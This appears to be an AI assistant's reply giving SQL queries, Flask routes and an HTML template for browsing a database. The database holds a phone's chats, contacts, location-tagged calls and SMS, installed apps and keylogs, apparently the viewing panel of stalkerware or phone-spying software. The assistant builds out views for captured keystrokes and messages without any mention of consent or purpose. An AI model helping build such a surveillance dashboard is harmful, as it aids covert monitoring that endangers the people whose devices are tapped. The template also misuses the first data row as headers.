Got it! If you have a list of tables with their columns, I’ll outline how you can use, query, and manage these tables effectively in Replit. Here’s a structured plan for working with multiple tables and visualizing data.

How to Query and Manage Multiple Tables in PostgreSQL from Replit

Example Tables and Columns

Here’s a list of the example tables and their columns based on the discussions:

1. Chats Table (chats):

sender (TEXT)

time (TIMESTAMP)

text (TEXT)



2. Contacts Table (contacts):

contact_id (SERIAL PRIMARY KEY)

name (TEXT)



3. Calls Table (calls):

call_type (TEXT)

time (TIMESTAMP)

from_to (TEXT)

duration (INTEGER)

location (TEXT)



4. SMS Table (sms):

sms_id (SERIAL PRIMARY KEY)

from_to (TEXT)

time (TIMESTAMP)

text (TEXT)

location (TEXT)



5. Installed Apps Table (installed_apps):

app_id (SERIAL PRIMARY KEY)

application_name (TEXT)

package_name (TEXT)

install_date (TIMESTAMP)



6. Keylogs Table (keylogs):

keylog_id (SERIAL PRIMARY KEY)

application (TEXT)

time (TIMESTAMP)

text (TEXT)

How to Query and Visualize Each Table

Below are SQL queries and corresponding Flask routes to help you query and visualize data from these tables in Replit.


---

1. Querying the chats Table

SQL Query:

SELECT sender, time, text FROM chats ORDER BY time DESC;

Flask Route:

@app.route('/chats')
def view_chats():
    rows = execute_query('SELECT sender, time, text FROM chats ORDER BY time DESC;')
    return render_template('chats.html', rows=rows)


---

2. Querying the contacts Table

SQL Query:

SELECT contact_id, name FROM contacts;

Flask Route:

@app.route('/contacts')
def view_contacts():
    rows = execute_query('SELECT contact_id, name FROM contacts;')
    return render_template('contacts.html', rows=rows)


---

3. Querying the calls Table

SQL Query:

SELECT call_type, time, from_to, duration, location FROM calls ORDER BY time DESC;

Flask Route:

@app.route('/calls')
def view_calls():
    rows = execute_query('SELECT call_type, time, from_to, duration, location FROM calls ORDER BY time DESC;')
    return render_template('calls.html', rows=rows)


---

4. Querying the sms Table

SQL Query:

SELECT from_to, time, text, location FROM sms ORDER BY time DESC;

Flask Route:

@app.route('/sms')
def view_sms():
    rows = execute_query('SELECT from_to, time, text, location FROM sms ORDER BY time DESC;')
    return render_template('sms.html', rows=rows)


---

5. Querying the installed_apps Table

SQL Query:

SELECT application_name, package_name, install_date FROM installed_apps ORDER BY install_date DESC;

Flask Route:

@app.route('/apps')
def view_installed_apps():
    rows = execute_query('SELECT application_name, package_name, install_date FROM installed_apps ORDER BY install_date DESC;')
    return render_template('installed_apps.html', rows=rows)


---

6. Querying the keylogs Table

SQL Query:

SELECT application, time, text FROM keylogs ORDER BY time DESC;

Flask Route:

@app.route('/keylogs')
def view_keylogs():
    rows = execute_query('SELECT application, time, text FROM keylogs ORDER BY time DESC;')
    return render_template('keylogs.html', rows=rows)

HTML Templates Example

Here’s a basic HTML template for viewing any table data.

Template: templates/data.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Data Viewer</title>
</head>
<body>
    <h1>Data from the Table</h1>
    <table border="1">
        <tr>
            {% for header in rows[0] %}
            <th>{{ header }}</th>
            {% endfor %}
        </tr>
        {% for row in rows %}
        <tr>
            {% for item in row %}
            <td>{{ item }}</td>
            {% endfor %}
        </tr>
        {% endfor %}
    </table>
</body>
</html>

Usage

1. Select the appropriate route (e.g., /chats, /contacts).


2. The data will be fetched and displayed using SQL queries.


3. Access each table’s view through their respective routes.

Conclusion

This structure ensures you can query and visualize data from multiple tables in PostgreSQL. Use the provided SQL queries and Flask routes to interact with each table efficiently in Replit. Let me know if further adjustments are needed!
